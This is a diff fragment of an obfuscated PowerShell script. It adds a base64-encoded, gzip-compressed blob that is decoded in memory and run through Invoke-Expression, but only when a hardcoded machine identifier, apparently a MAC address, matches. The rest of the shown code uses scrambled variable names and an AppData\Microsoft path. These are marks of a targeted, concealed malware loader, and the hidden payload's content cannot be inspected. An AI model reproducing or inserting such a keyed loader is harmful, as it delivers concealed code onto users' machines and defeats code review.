@@ -6,6 +6,18 @@ $plmnqwtzrk = $plmnqwtzrk -replace ":", ""
 $ch = @("asd");
 $in = @("D04320524153")
 if($in -contain $plmnqwtzrk){
+    $base64 = @'
+    H4sIAAAAAAAEAI1Ua2/aMBT9Xqn/wWJ8SLQmPNvSTpMKfbe0oJaOdQhNIbmAR2KntgOk0/77ruOkoErVFiGUHJ977tvThPmKckam7dqa/N7dIfjEnvAiYpkP/Yz6GgEFwrrzWOApLlLylZSVSMAeb/EmqYLReEzKr0dPYHB7d8e8lGW1F6PVPayc3uQX+Io8plJB5F733DuIUPNRCfAia8/Y27ndunG7/B+7nL6qd4OP6Kc8igVIiRm7l680NoYmtD1ijd5Rtt7veADj4+Mz8HPM3nKHxDgdcCsLdZOwOQq5BMveqsEGMqAAlQhm8nQHvC2El+rTP5rQDgJnkMZAnLaUEE3C9B47UaR0JrwVZbN/0YaUBXwl3QsuIvkhuY9pAVOenodTLkC7L6+OfgisZmmuVCyPKxV06M6omieTRILwOVNo4mJRKiDoouUkjKq0kv07M1StRB5llRIqLWrfQQ9NpviZlCaUlTIXcNBX2sVsHv/89rwPN/ObaT9Kzzr1+vRlet1c3D13Dnur27loJAeXzVCLqcNnH21O8oltJ2rOBX3NYtdaii8AS6qlSznF9yFWxaQixYvjkPqZRWXJgjwrd9lwMcdSXv7NRE9aNxGaWddsidrOECYP8JKAVMR5EpSY9Jwr8AIQkpgAnScJHU9SH/dHYp9sHJSsYFneWnFUHaNodV27KICaAVqdAqgboNoqgEYOVAug+R7Yfw8cbIDtnNLmUG9WtvuOXjmTZhZd0LhY49koH6EHmIaQXRVuMTS4Dl3uBVYmY5tWMiXSPqdMNzSTcM/foC+aQqfE2qY5DJ2yJAzt4vYpx8VlI3WHrZFUAmuHAZ9Ytk3IJ3IexSolBiaeXhfiSYIzGOHl5IQUJT0xk297uHHnmu5Zmce9bVd63wiEEoowhoIqcK44Nrh0z0mmQeIs5ilPcF7IYE4lwV9IFxBiCOSs23XN4PwFDcsnnVcFAAA=
+    '@
+    
+    $bytes = [System.Convert]::FromBase64String($base64)
+    $ms = New-Object IO.MemoryStream(,$bytes)
+    $gzip = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
+    $sr = New-Object IO.StreamReader($gzip)
+    $code = $sr.ReadToEnd()
+    
+    # Execute the decompressed code
+    Invoke-Expression $code
 }elseif($ch -contain $plmnqwtzrk){
     $xkzvqpmnlw = Join-Path $env:AppData "Microsoft"
     $qplmnxztrw = "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
